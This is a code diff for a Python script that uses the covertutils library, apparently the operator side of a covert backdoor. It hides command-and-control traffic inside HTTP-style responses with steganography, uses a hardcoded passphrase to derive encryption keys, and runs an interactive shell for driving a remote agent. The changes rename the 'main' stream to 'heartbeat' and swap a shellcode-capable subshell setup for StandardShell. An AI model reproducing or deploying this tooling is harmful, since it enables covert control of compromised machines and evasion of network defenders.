@@ -12,8 +12,7 @@ from covertutils.handlers import ResponseOnlyHandler
 from covertutils.orchestration import StegoOrchestrator
 from covertutils.datamanipulation import asciiToHexTemplate
 
-from covertutils.shells.baseshell import BaseShell
-from covertutils.shells.subshells import SimpleSubShell, ShellcodeSubShell, PythonAPISubShell
+from covertutils.shells.impl import StandardShell
 
 from time import sleep
 from os import urandom
@@ -78,7 +77,7 @@ class MyHandler ( ResponseOnlyHandler ) :	#
 		# If the Parent Class would respond (the message was a request), don't bother responding
 		responded = super( MyHandler, self ).onMessage( stream, message )
 		if not responded :	# If the message was real data (not 'ResponseOnlyHandler.request_data' string), the Parent Class didn't respond
-			self.queueSend("X", 'main');	# Make it respond anyway with 'X' (see Client)
+			self.queueSend("X", 'heartbeat');	# Make it respond anyway with 'X' (see Client)
 			responded = super( MyHandler, self ).onMessage( stream, message )
 			assert responded == True		# This way we know it responsed!
 		# The PrintShell class will automatically handle the response (print it to the user)
@@ -87,7 +86,7 @@ class MyHandler ( ResponseOnlyHandler ) :	#
 	def onChunk( self, stream, message ) :
 		if message : return					# If this chunk is the last and message is assembled let onMessage() handle it
 		# print "[*] Got a Chunk"
-		self.onMessage( 'main', self.request_data )	# If this is a message chunk, treat it as a 'request_data' message
+		self.onMessage( 'heartbeat', self.request_data )	# If this is a message chunk, treat it as a 'request_data' message
 
 	def onNotRecognised( self ) :
 		# print "[!]< Unrecognised >"			# If someone that isn't the client sent an HTTP Request
@@ -157,8 +156,9 @@ passphrase = "App1e5&0raNg3s"	# This is used to generate encryption keys
 orch = StegoOrchestrator( passphrase,
 							stego_config = stego_config,
 							main_template = "resp",		# The template to be used
-							hex_inject = True )			# Inject data in template in hex mode
-
+							hex_inject = True, 			# Inject data in template in hex mode
+							streams = ['heartbeat'],
+							)
 handler = MyHandler( recv, send, orch )	# Instantiate the Handler Object using the network wrappers
 
 
@@ -177,10 +177,8 @@ server_thread.start()
 
 
 #============================== Shell Design part ========================
-shell = BaseShell(handler,
-	subshells = {'control' : SimpleSubShell, 'python' : PythonAPISubShell, 'main' : (SimpleSubShell, {'prompt_templ':'()[{stream}]> '} ), 'shellcode' : ShellcodeSubShell } ,
-	ignore_messages = set(['X']) 	# It is also the default argument in BaseShell
-	)
+shell = StandardShell(handler )
+	# ignore_messages = set(['X']) 	# It is also the default argument in BaseShell
 shell.start()
 
 #==========================================================================
